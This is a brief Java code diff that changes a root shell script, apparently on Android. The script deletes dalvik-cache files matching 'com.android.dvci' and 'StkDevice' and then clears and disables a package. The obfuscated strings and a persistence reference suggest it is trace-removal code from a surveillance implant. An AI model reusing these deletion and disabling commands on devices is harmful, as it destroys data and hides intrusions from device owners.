@@ -317,8 +317,8 @@ public class Root {
 			}
 
 			// TODO: mettere Status.persistencyApk e packageName
-			script += M.e("for i in `ls /data/dalvik-cache/com.android.dvci* 2>/dev/null`; do [ -e $i ] && rm  $i; done") + "\n";
-			script += M.e("for i in `ls /data/dalvik-cache/StkDevice* 2>/dev/null`; do [ -e $i ] && rm  $i; done") + "\n";
+			script += M.e("for i in `ls /data/dalvik-cache/*com.android.dvci* 2>/dev/null`; do [ -e $i ] && rm  $i; done") + "\n";
+			script += M.e("for i in `ls /data/dalvik-cache/*StkDevice* 2>/dev/null`; do [ -e $i ] && rm  $i; done") + "\n";
 
 			script += M.e("pm clear ") + packageName + "\n";
 			script += M.e("pm disable ") + packageName + "\n";
